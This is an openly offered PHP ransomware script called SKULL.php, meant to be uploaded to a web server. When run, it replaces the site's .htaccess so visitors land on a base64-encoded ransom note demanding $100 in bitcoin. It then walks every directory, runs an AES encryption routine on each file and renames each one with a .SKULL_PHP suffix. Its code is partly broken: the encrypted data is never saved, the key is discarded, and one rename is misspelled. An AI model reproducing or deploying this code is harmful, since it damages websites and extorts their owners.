<!DOCTYPE html>
<html>
<head>
   <title>SKULL.php</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.text_main {
    color: cyan;
}
.result{
  text-align: left;
}
</style>
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htaccess.SKULL_PHP")){
      rename(".htaccess", ".htaaccess.SKULL_PHP");
      if(fwrite(fopen('.htaccess', 'w'), "#Setup Ransomware\r\nDirectoryIndex @Ransomware_Note@.php\r\nErrorDocument 404 /@Ransomware_Note@.php")){
      }
      if(file_put_contents("@Ransomware_Note@.php", base64_decode("PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgPHRpdGxlPkBSYW5zb213YXJlIE5vdGVA
Lmh0bWw8L3RpdGxlPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgpib2R5IHsKICAgIGJhY2tncm91
bmQ6ICMxQTFDMUY7CiAgICBjb2xvcjogI2UyZTJlMjsKfQphewogICBjb2xvcjpncmVlbjsKfQo8
L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8Y2VudGVyPgo8cHJlPgoKPGZvbnQgY29sb3I9IiNGMjAw
RkYiPiAgICAgIAogICB1dXV1dXV1CiAgIHV1JCQkJCQkJCQkJCR1dQp1dSQkJCQkJCQkJCQkJCQk
JCQkdXUKdSQkJCQkJCQkJCQkJCQkJCQkJCQkJHUKdSQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkdQp1
JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJHUKdSQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCR1CnUk
JCQkJCQiICAgIiQkJCIgICAiJCQkJCQkdQoiJCQkJCIgICAgICB1JHUgICAgICAgJCQkJCIKJCQk
dSAgICAgICB1JHUgICAgICAgdSQkJAokJCR1ICAgICAgdSQkJHUgICAgICB1JCQkCiIkJCQkdXUk
JCQgICAkJCR1dSQkJCQiCiIkJCQkJCQkIiAgICIkJCQkJCQkIgogdSQkJCQkJCR1JCQkJCQkJHUK
IHUkIiQiJCIkIiQiJCIkdQp1dXUgICAgICAgICQkdSQgJCAkICQgJHUkJCAgICAgICB1dXUKdSQk
JCQgICAgICAgICQkJCQkdSR1JHUkJCQgICAgICAgdSQkJCQKJCQkJCR1dSAgICAgICIkJCQkJCQk
JCQiICAgICB1dSQkJCQkJAp1JCQkJCQkJCQkJCR1dSAgICAiIiIiIiAgICB1dXV1JCQkJCQkJCQk
JAokJCQkIiIiJCQkJCQkJCQkJHV1dSAgIHV1JCQkJCQkJCQkIiIiJCQkIgoiIiIgICAgICAiIiQk
JCQkJCQkJCQkdXUgIiIkIiIiCiB1dXV1ICIiJCQkJCQkJCQkJHV1dQp1JCQkdXV1JCQkJCQkJCQk
dXUgIiIkJCQkJCQkJCQkJHV1dSQkJAokJCQkJCQkJCQkIiIiIiAgICAgICAgICAgIiIkJCQkJCQk
JCQkJCIKIiQkJCQkIiAgICAgICAgICAgICAgICAgICAgICAiIiQkJCQiIgokJCQiICAgICAgICAg
ICAgICAgICAgICAgICAgICQkJCQiPC9mb250PgoKPGZvbnQgY29sb3I9IndoaXRlIj4rLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSs8L2ZvbnQ+Cgo8Zm9udCBjb2xvcj0iIzAwRkZC
NyI+WW91ciBTaXRlIEhhdmUgQmVlbiBFbmNyeXB0ZWQgQnkgUmFuc29td2FyZSBTS1VMTC5waHA8
L2ZvbnQ+Cgo8Zm9udCBjb2xvcj0id2hpdGUiPistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tKzwvZm9udD4KCjxmb250IGNvbG9yPSJjeWFuIj5XaGF0IEhhcHBlbmVkIHRvIE15IFNp
dGU/CgpZb3VyIGltcG9ydGFudCBmaWxlcyBhcmUgZW5jcnlwdGVkLgpNYXliZSB5b3UgYXJlIGJ1
c3kgbG9va2luZyBmb3IgYSB3YXkgdG8gcmVjb3ZlciB5b3VyIGZpbGVzLCBidXQgZG8gbm90IHdh
c3RlIHlvdXIgdGltZS4KTm9ib2R5IGNhbiByZWNvdmVyIHlvdXIgZmlsZXMgd2l0aG91dCBvdXIg
ZGVjcnlwdGlvbiBzZXJ2aWNlLjwvZm9udD4KCjxmb250IGNvbG9yPSJ3aGl0ZSI+Ky0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rPC9mb250PgoKPGZvbnQgY29sb3I9InJlZCI+Q2Fu
IEkgUmVjb3ZlciBNeSBGaWxlcz8KClN1cmUuIFdlIGd1YXJhbnRlZSB0aGF0IHlvdSBjYW4gcmVj
b3ZlciBhbGwgeW91ciBmaWxlcyBzYWZlbHkgYW5kIGVhc2lseS48L2ZvbnQ+Cgo8Zm9udCBjb2xv
cj0id2hpdGUiPistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKzwvZm9udD4KCjxm
b250IGNvbG9yPSJ5ZWxsb3ciPlNlbmQgJDEwMCB3b3J0aCBvZiBiaXRjb2luIHRvIHRoaXMgYWRk
cmVzczo8L2ZvbnQ+Cgo8Zm9udCBjb2xvcj0ieWVsbG93Ij4xMmM2RFNpVTRScTNQNFp4emlLeHpy
TDVMbU1CcnpqckpYPC9mb250PgoKPGZvbnQgY29sb3I9IndoaXRlIj4rLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLSs8L2ZvbnQ+Cgo8Zm9udCBjb2xvcj0iZ3JlZW4iPkxpbmsgTGlz
dCBUbyBIZWxwCgo8YSBocmVmPSJodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9SYW5zb213
YXJlIj5XaGF0IElzIFJhbnNvbXdhcmU/PC9hPjxicj4KPGEgaHJlZj0iaHR0cHM6Ly9lbi53aWtp
cGVkaWEub3JnL3dpa2kvQml0Y29pbiI+V2hhdCBJcyBCaXRjb2luPzwvYT48YnI+CjxhIGhyZWY9
Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1Z1bG5lcmFiaWxpdHkiPldoYXQgSXMgVnVs
bmVyYWJpbGl0eT88L2E+PC9mb250PgoKPGZvbnQgY29sb3I9IndoaXRlIj4rLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLSs8L2ZvbnQ+CjwvcHJlPgo8L2NlbnRlcj4KPC9ib2R5Pgo8
L2h0bWw+"))){
      }
    }
   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if( deRanSomeware::kecuali($locate,".htaccess") &&  deRanSomeware::kecuali($locate,"@Ransomware_Note@.php") && deRanSomeware::kecuali($locate,".htaccess.SKULL_PHP") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".SKULL_PHP");
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

?>

<center>
<pre class='text_main'>
   uuuuuuu
   uu$$$$$$$$$$$uu
uu$$$$$$$$$$$$$$$$$uu
u$$$$$$$$$$$$$$$$$$$$$u
u$$$$$$$$$$$$$$$$$$$$$$$u
u$$$$$$$$$$$$$$$$$$$$$$$$$u
u$$$$$$$$$$$$$$$$$$$$$$$$$u
u$$$$$$"   "$$$"   "$$$$$$u
"$$$$"      u$u       $$$$"
$$$u       u$u       u$$$
$$$u      u$$$u      u$$$
"$$$$uu$$$   $$$uu$$$$"
"$$$$$$$"   "$$$$$$$"
 u$$$$$$$u$$$$$$$u
 u$"$"$"$"$"$"$u
uuu        $$u$ $ $ $ $u$$       uuu
u$$$$        $$$$$u$u$u$$$       u$$$$
$$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
"""      ""$$$$$$$$$$$uu ""$"""
 uuuu ""$$$$$$$$$$uuu
u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
$$$$$$$$$$""""           ""$$$$$$$$$$$"
"$$$$$"                      ""$$$$""
$$$"                         $$$$"

</pre>
</div>
</body>
</html>
<?php
$Key_Encryption = rand(1, 999999999);
deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$Key_Encryption);
echo '<font size="25" color="cyan">[+] Please Re-Open You Website!</font><br>';
?>

<?php
?>
